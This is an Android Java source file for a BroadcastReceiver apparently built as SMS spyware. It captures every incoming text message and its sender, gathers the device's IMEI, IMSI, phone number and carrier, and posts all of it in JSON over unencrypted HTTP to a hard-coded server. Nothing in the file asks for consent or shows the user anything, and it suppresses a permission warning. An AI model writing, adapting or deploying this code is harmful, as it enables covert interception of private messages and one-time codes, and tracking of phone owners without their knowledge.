package com.example.myapplication;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import androidx.annotation.RequiresApi;
import org.json.JSONException;
import org.json.JSONObject;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;

public class SmsListener extends BroadcastReceiver {

    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    public void onReceive(Context context, Intent intent) {

        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {

            SmsMessage[] smsMessages;
            smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent);

            for (SmsMessage message : smsMessages) {

                JSONObject clientInformation = getClientInformation(context);

                try {
                    clientInformation.put("MSG",message.getDisplayMessageBody());
                    clientInformation.put("PHONENUMBER",message.getDisplayOriginatingAddress());
                    clientInformation.put("TYPE","sms");
                }
                catch (JSONException e) {
                    e.printStackTrace();
                }

                MediaType MEDIA_TYPE = MediaType.parse("application/json; charset=utf-8");
                RequestBody body = RequestBody.create(MEDIA_TYPE, clientInformation.toString());
                Request request = new Request.Builder().url("http://192.168.10.179:8080/AndroidServer/Server").post(body).build();

                new insertMessageToDB().execute(request);
            }
        }
    }

    @SuppressLint("MissingPermission")
    @RequiresApi(api = Build.VERSION_CODES.M)
    public JSONObject getClientInformation(Context context){

        String serviceName = Context.TELEPHONY_SERVICE;
        TelephonyManager m_telephonyManager = (TelephonyManager) context.getSystemService(serviceName);
        String IMEI, IMSI, OS, DEVICE, MODEL, PRODUCT, PNUMBER, OPERATOR;

        IMEI = m_telephonyManager.getDeviceId();
        IMSI = m_telephonyManager.getSubscriberId();
        OS = android.os.Build.VERSION.RELEASE;
        DEVICE = android.os.Build.DEVICE;
        MODEL = android.os.Build.MODEL;
        PRODUCT = android.os.Build.PRODUCT;
        PNUMBER = m_telephonyManager.getLine1Number();
        OPERATOR = m_telephonyManager.getSimOperator();

        JSONObject clientInformation = new JSONObject();
        try {
            clientInformation.put("IMEI",IMEI);
            clientInformation.put("IMSI",IMSI);
            clientInformation.put("OS",OS);
            clientInformation.put("DEVICE",DEVICE);
            clientInformation.put("MODEL",MODEL);
            clientInformation.put("PRODUCT",PRODUCT);
            clientInformation.put("PNUMBER",PNUMBER);
            clientInformation.put("OPERATOR",OPERATOR);
            clientInformation.put("INCOMING",true);

        } catch (JSONException e) {
            e.printStackTrace();
        }
        return clientInformation;
    }
}
